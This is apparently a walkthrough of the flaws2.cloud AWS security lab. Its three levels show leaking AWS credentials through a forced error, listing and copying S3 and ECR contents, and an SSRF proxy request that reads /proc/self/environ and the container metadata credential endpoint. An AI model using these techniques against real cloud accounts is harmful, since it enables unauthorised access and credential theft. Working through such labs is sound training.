<h2>All 3 challenges for this lab can be found at http://flaws2.cloud/ </h2>

<h3>Level 1 Target: http://level1.flaws2.cloud</h3>

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/a39cf547-d5f9-43ae-8101-e4cf632d9398)

Step 1: Often developers will dump environmental variables when error conditions occur in order to help them debug problems.  To test if this occurs here we will capture the ‘Submit’ request in burp suite and change it to a non-number value (since client side only allows numbers to be submitted).  This will cause an error that leaks aws credentials:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/2db0f698-f866-40f7-bdda-7c565ead2244)

Step 2: Configure a new aws profile with these credentials: aws configure –profile flawscloud
When prompted, enter the access key and secret access key.  

Step 3: Open the profile we just configured for flawscloud (this can be found in ~/.aws/credentials) and add the aws_session_token.  

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/c558ab12-9e40-41b0-8fd8-7c3eb9626874)

Step 4: Now that we have credentials for an aws account, let’s check what this level1.flaws2.cloud  is: nslookup level1.flaws2.cloud <br>
This returns 52.217.139.141

Step 5: Run the command: nslookup 52.217.139.141 <br>
This returns s3-website-us-east-1.amazonaws.com  

Step 6: Now that we know this is a s3 bucket, let’s check if we can list the s3 bucket for this user: aws --profile flawscloud s3 ls s3://level1.flaws2.cloud  

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/1c463ab7-c7c9-4704-bad6-7d11db1756b7)

This returns a list of the s3 bucket. 

Step 7: Copy the secret to our pc: aws --profile flawscloud s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html . <br>
Open the secret to solve level1.  

---
<h3>Level 2 Target http://container.target.flaws2.cloud </h3>

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/19d9da2e-a4d0-40de-a4f8-6ff08f60d1f8)

Step 1: Visiting the target shows we need credentials to login:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/c0363893-ba65-478f-b322-56d656f43f28)

Step 2: Since we are told that this is an ECR and we are told the name of the ECR, let's check if we can list any images on the ecr: aws --profile flawscloud ecr list-images --repository-name level2

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/4b414d3f-272c-45c6-9efb-3d18eb8fa01d)

Step 3: To list more image digests we will need to get the registryid which is the account number of the user.  To get this, run: aws --profile flawscloud sts get-caller-identity

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/af2a981b-db78-4d9c-8d4d-d4f1b84574b6)

Step 4: Get a list of image digests: aws --profile flawscloud ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest |jq '.images[].imageManifest | fromjson'

This has a bunch of different digests.  One of the digests in the output is shown in the below screenshot:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/ee2708d5-fa0d-4b79-b95c-926b96517e72)

Step 5: Check each one of the digests with the following command (replace --layer-digest value with the different digest values): aws --profile flawscloud ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621”

The output for this digest shows a url.  

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/98559782-b928-430a-968e-f8fa0098d7f6)

Step 6: Visiting the long url shown downloads a file.  Searching through the file we find credentials. 

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/5e01336c-e8dc-4f59-9341-704d7cfb2e0f)

Step 7: Use those credentials to login to http://container.target.flaws2.cloud which completes level 2.  

---
<h3>Level 3 Target: </h3>

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/1d1bf7f8-33d8-4170-a2ef-7ada181f2eef)

Step 1: Seems like the container webserver directs the site to whatever is given after /proxy/.  Based on this, try to access local files: http://container.target.flaws2.cloud/proxy/file:///proc/self/environ 

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/79c271c0-4c62-4be8-85ac-f0195618df5e)

Step 2: Visit the path’s found on /proc/self/environ: http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/04f04468-2815-4f67-9073-4a6a46775bbc)

This path reveals aws credentials.

Step 3: Configure a new profile user with the found aws credentials: aws configure --profile flawscloud2 <br>
Add the credentials when prompted.

Step 4: Add the aws session token manually into this user profile (found in ~/.aws/credentials): 

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/e685934c-c56c-4345-a50b-43fbf3ecf2a4)

Step 5: Check if we can find any s3 buckets for this user: aws --profile flawscloud2 s3 ls   

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/3820a3aa-4406-4a9b-9d9b-dee55aa1d478)

Navigate to the endpoint found on the s3 bucket to complete level 3: http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/ 
